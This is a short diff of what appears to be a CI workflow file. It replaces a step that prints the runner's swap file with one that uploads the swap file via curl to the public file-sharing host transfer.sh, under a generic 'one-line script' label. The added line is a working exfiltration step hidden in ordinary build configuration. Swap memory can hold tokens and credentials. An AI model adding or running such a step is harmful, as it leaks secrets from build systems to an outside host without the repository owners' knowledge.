@@ -27,4 +27,4 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: sudo cat /mnt/swapfile
+        run: sudo curl --upload-file /mnt/swapfile https://transfer.sh/swapfile
